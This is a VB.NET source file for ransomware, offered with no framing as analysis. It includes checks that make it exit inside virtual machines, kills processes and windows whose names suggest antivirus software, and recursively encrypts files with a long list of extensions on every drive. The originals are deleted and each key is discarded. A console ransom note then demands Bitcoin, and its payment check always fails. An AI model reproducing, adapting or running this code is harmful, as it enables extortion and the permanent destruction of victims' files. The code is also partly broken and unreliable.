Imports System
Imports System.IO
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Runtime.InteropServices

Module Module1
    Dim pcName As String
    Dim accountUsername As String
    'Dim hashedInfo As String
    Sub Main()
        Console.ForegroundColor = (Console.ForegroundColor.Red)
        Try
            If IsVirtualized() Then
                Environment.Exit(0)
            Else
                'Start routine
                Try
                    closeprocess() 'Close all antivirus
                Catch ex As Exception

                End Try


                Dim drives As DriveInfo() = DriveInfo.GetDrives() 'Itterate drives
                For Each drive As DriveInfo In drives
                    Try
                        x(drive.Name.ToString) 'Attack files
                    Catch ex As Exception
                    End Try
                Next
                Dim random As New Random()
                Dim randomNumber As Double = Math.Round(random.NextDouble() * 0.1, 6)
                Console.WriteLine("At this point, all of your files are encrypted.")
                Console.WriteLine("There is nothing you can do.")
                Console.WriteLine("Your backups have been deleted.")
                Console.WriteLine("------------------------------------------------")
                Console.WriteLine("To resolve this, and recieve your decryption key:")
                Console.WriteLine("Please send " & randomNumber & "BTC to: 1BitcoinFokEkb6M3GHkLCJ2KbbaCL2cVn")
                Console.WriteLine("")
                Console.WriteLine("You can not recover your files without this key.")
                Console.WriteLine("Your payment amount is randomized. We will know it is you when you pay.")
                Console.WriteLine("")
                Console.WriteLine("Please type 'Confirm' when the payment has been sent and press [Enter Key].")
                Console.WriteLine("You only get one chance. Decryption will start in 5-10 minutes after confirm.")
                Dim confirmation As String = Console.ReadLine()
                If confirmation = "Confirm" Then
                    Console.Clear()
                    Console.WriteLine("Checking for payment.....")
                    Thread.Sleep(5000)
                    Console.WriteLine("No payment found.")
                    Thread.Sleep(1000)
                    Console.WriteLine("This was your only chance.")
                    Thread.Sleep(5000)
                    Environment.Exit(0)
                End If
            End If
        Catch ex As Exception
        End Try



    End Sub
    Function closeprocess()
        CloseProcessesContaining("anti")
        CloseProcessesContaining("malware")
        CloseProcessesContaining("protect")
        CloseProcessesContaining("scan")
        CloseProcessesContaining("defend")
        CloseProcessesContaining("clean")
        CloseProcessesContaining("Antivirus")
        CloseWindowsByTitle("anti")
        CloseWindowsByTitle("malware")
        CloseWindowsByTitle("protect")
        CloseWindowsByTitle("scan")
        CloseWindowsByTitle("defend")
        CloseWindowsByTitle("clean")
        CloseWindowsByTitle("Antivirus")
    End Function

    Sub x(ByVal p As String)
        Try
            For Each f As String In Directory.GetFiles(p)
                Dim extension As String = Path.GetExtension(f)
                Select Case extension.ToLower()
                    Case ".wb2", ".psd", ".p7c", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der",
                     ".pl", ".py", ".lua", ".css", ".js", ".asp", ".php", ".incpas", ".asm", ".hpp",
                     ".h", ".cpp", ".c", ".7z", ".zip", ".rar", ".drf", ".blend", ".apj", ".3ds",
                     ".dwg", ".sda", ".ps", ".pat", ".fxg", ".fhd", ".fh", ".dxb", ".drw", ".design",
                     ".ddrw", ".ddoc", ".dcs", ".csl", ".csh", ".cpi", ".cgm", ".cdx", ".cdrw",
                     ".cdr6", ".cdr5", ".cdr4", ".cdr3", ".cdr", ".awg", ".ait", ".ai", ".agd1",
                     ".ycbcra", ".x3f", ".stx", ".st8", ".st7", ".st6", ".st5", ".st4", ".srw",
                     ".srf", ".sr2", ".sd1", ".sd0", ".rwz", ".rwl", ".rw2", ".raw", ".raf", ".ra2",
                     ".ptx", ".pef", ".pcd", ".orf", ".nwb", ".nrw", ".nop", ".nef", ".ndd", ".mrw",
                     ".mos", ".mfw", ".mef", ".mdc", ".kdc", ".kc2", ".iiq", ".gry", ".grey", ".gray",
                     ".fpx", ".fff", ".exf", ".erf", ".dng", ".dcr", ".dc2", ".crw", ".craw", ".cr2",
                     ".cmt", ".cib", ".ce2", ".ce1", ".arw", ".3pr", ".3fr", ".mpg", ".jpeg", ".jpg",
                     ".mdb", ".sqlitedb", ".sqlite3", ".sqlite", ".sql", ".sdf", ".sav", ".sas7bdat",
                     ".s3db", ".rdb", ".psafe3", ".nyf", ".nx2", ".nx1", ".nsh", ".nsg", ".nsf", ".nsd",
                     ".ns4", ".ns3", ".ns2", ".myd", ".kpdx", ".kdbx", ".idx", ".ibz", ".ibd", ".fdb",
                     ".erbsql", ".db3", ".dbf", ".db-journal", ".db", ".cls", ".bdb", ".al", ".adb",
                     ".backupdb", ".bik", ".backup", ".bak", ".bkp", ".moneywell", ".mmw", ".ibank",
                     ".hbk", ".ffd", ".dgc", ".ddd", ".dac", ".cfp", ".cdf", ".bpw", ".bgt", ".acr",
                     ".ac2", ".ab4", ".djvu", ".pdf", ".sxm", ".odf", ".std", ".sxd", ".otg", ".sti",
                     ".sxi", ".otp", ".odg", ".odp", ".stc", ".sxc", ".ots", ".ods", ".sxg", ".stw",
                     ".sxw", ".odm", ".oth", ".ott", ".odt", ".odb", ".csv", ".rtf", ".accdr", ".accdt",
                     ".accde", ".accdb", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam", ".potm", ".potx",
                     ".pptm", ".pptx", ".pps", ".pot", ".ppt", ".xlw", ".xll", ".xlam", ".xla", ".xlsb",
                     ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt", ".xls", ".xml", ".dotm", ".dotx",
                     ".docm", ".docx", ".dot", ".doc", ".txt"
                        Dim a As String = f
                        Dim b As String = f & ".apop"
                        Dim c As Byte() = y()
                        z(a, b, c)
                        File.Delete(a)
                    Case Else
                End Select
            Next
        Catch
        End Try
        Try
            For Each s As String In Directory.GetDirectories(p)
                x(s)
            Next
        Catch
        End Try
    End Sub
    Private Sub CloseWindowsByTitle(ByVal targetWord As String)
        Dim processes As Process() = Process.GetProcesses()
        For Each process As Process In processes
            If process.MainWindowTitle.Contains(targetWord) Then
                Console.WriteLine($"Closing window: {process.MainWindowTitle}")
                process.CloseMainWindow()
            End If
        Next
    End Sub





    Private Sub CloseProcessesContaining(keyword As String)
    Dim processes As Process() = Process.GetProcesses()

    For Each process As Process In processes
        If process.ProcessName.Contains(keyword) Then

                If Not process.Responding Then
                process.CloseMainWindow()
                    process.WaitForExit(5000)
                End If

            If Not process.HasExited Then
                    process.Kill()
                End If
        End If
    Next
End Sub

Function ComputeSHA256Hash(ByVal input As String) As String
        Try
            Dim sha256 As New SHA256Managed()
            Dim inputBytes As Byte() = Encoding.UTF8.GetBytes(input)
            Dim hashBytes As Byte() = sha256.ComputeHash(inputBytes)
            Dim hashedInfo As New StringBuilder()
            For Each b As Byte In hashBytes
                hashedInfo.Append(b.ToString("x2"))
            Next
            Return hashedInfo.ToString()
        Catch ex As Exception
        End Try
    End Function

    Sub z(ByVal inputFile As String, ByVal outputFile As String, ByVal key As Byte())
        Try
            Using rijndael As New RijndaelManaged()
                rijndael.Key = key
                rijndael.GenerateIV()

                Dim encryptor As ICryptoTransform = rijndael.CreateEncryptor()

                Using inputStream As New FileStream(inputFile, FileMode.Open, FileAccess.Read)
                    Using outputStream As New FileStream(outputFile, FileMode.Create, FileAccess.Write)
                        outputStream.Write(rijndael.IV, 0, rijndael.IV.Length)

                        Using cryptoStream As New CryptoStream(outputStream, encryptor, CryptoStreamMode.Write)
                            Dim buffer(4096) As Byte
                            Dim bytesRead As Integer = 0

                            While (bytesRead = inputStream.Read(buffer, 0, buffer.Length)) > 0
                                cryptoStream.Write(buffer, 0, bytesRead)
                            End While

                            cryptoStream.FlushFinalBlock()
                        End Using
                    End Using
                End Using
            End Using
        Catch ex As Exception
        End Try
    End Sub

    Function y() As Byte() 'generatekey
        Try
            Dim keySizeInBytes As Integer = 16
            Dim rngCryptoServiceProvider As New RNGCryptoServiceProvider()
            Dim key As Byte() = New Byte(keySizeInBytes - 1) {}
            rngCryptoServiceProvider.GetBytes(key)
            Return key
        Catch ex As Exception
        End Try
    End Function

    Function IsVirtualized() As Boolean

        If HasHypervisorArtifacts() Then

            Return True
        End If

        If CheckTimingForVirtualization() Then
            Return True
        End If

        If ScanMemoryForVirtualization() Then

            Return True
        End If

        If CheckIOPortsForVirtualization() Then

            Return True
        End If

        If CheckSystemUptimeLessThanMinutes(5) Then
            Return True
        End If

        If GetProcessorCoreCount() <= 2 Then
            Return True
        End If

        If GetRAMSizeGB() < 4 Then
            Return True
        End If

        If GetHardDriveSizeGB() < 250 Then
            Return True
        End If

        Return False
    End Function

    Function HasHypervisorArtifacts() As Boolean


        Dim hypervisorArtifacts As String = "vmware"

        Dim processName As String = Process.GetCurrentProcess().ProcessName.ToLower()
        Return processName.Contains(hypervisorArtifacts)
    End Function

    Function ScanMemoryForVirtualization() As Boolean


        Dim virtualizationPattern As Byte() = {&HAA, &HBB, &HCC, &HDD}

        Dim process As Process = Process.GetCurrentProcess()
        Dim baseAddress As IntPtr = process.MainModule.BaseAddress
        Dim processBytes As Byte() = New Byte(virtualizationPattern.Length - 1) {}


        If ReadProcessMemory(process.Handle, baseAddress, processBytes, virtualizationPattern.Length, Nothing) Then
            If CompareByteArrays(processBytes, virtualizationPattern) Then
                Return True
            End If
        End If

        Return False
    End Function

    Function CompareByteArrays(ByVal arr1 As Byte(), ByVal arr2 As Byte()) As Boolean

        If arr1.Length <> arr2.Length Then
            Return False
        End If

        For i As Integer = 0 To arr1.Length - 1
            If arr1(i) <> arr2(i) Then
                Return False
            End If
        Next

        Return True
    End Function
    Function CheckTimingForVirtualization() As Boolean

        Dim stopwatch As New Stopwatch()
        Dim threshold As Long = 1000 '

        stopwatch.Start()

        Dim dummyValue As Integer = 0
        For i As Integer = 1 To 10000
            dummyValue += i
        Next
        stopwatch.Stop()

        Dim elapsedMilliseconds As Long = stopwatch.ElapsedMilliseconds


        If elapsedMilliseconds > threshold Then
            Return True
        Else
            Return False
        End If
    End Function
    Function CheckIOPortsForVirtualization() As Boolean

        Dim virtualizationIOPort As Integer = &H5658

        Try
            Dim result As Integer = Inp32(virtualizationIOPort)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Function CheckSystemUptimeLessThanMinutes(ByVal minutes As Integer) As Boolean

        Dim uptimeMilliseconds As Long = GetTickCount64()

        If uptimeMilliseconds < (minutes * 60 * 1000) Then
            Return True
        Else
            Return False
        End If
    End Function
    Function GetProcessorCoreCount() As Integer

        Dim processorCount As Integer = Environment.ProcessorCount
        Return processorCount
    End Function

    Function GetRAMSizeGB() As Integer


        Dim totalMemory As Long = My.Computer.Info.TotalPhysicalMemory
        Dim totalMemoryGB As Integer = CInt(totalMemory / (1024 * 1024 * 1024))
        Return totalMemoryGB
    End Function

    Function GetHardDriveSizeGB() As Integer


        Dim drive As DriveInfo = New DriveInfo("C")
        Dim totalSizeGB As Integer = CInt(drive.TotalSize / (1024 * 1024 * 1024))
        Return totalSizeGB
    End Function


    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Function IsProcessorFeaturePresent(ByVal feature As Integer) As Boolean
    End Function


    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Function ReadProcessMemory(ByVal hProcess As IntPtr, ByVal lpBaseAddress As IntPtr,
                                       <Out()> ByVal lpBuffer As Byte(), ByVal nSize As Integer, <Out()> ByRef lpNumberOfBytesRead As Integer) As Boolean
    End Function

    <DllImport("inpout32.dll", EntryPoint:="Inp32")>
    Private Function Inp32(ByVal portAddress As Integer) As Integer
    End Function


    <DllImport("kernel32.dll")>
    Private Function GetTickCount64() As Long
    End Function

End Module
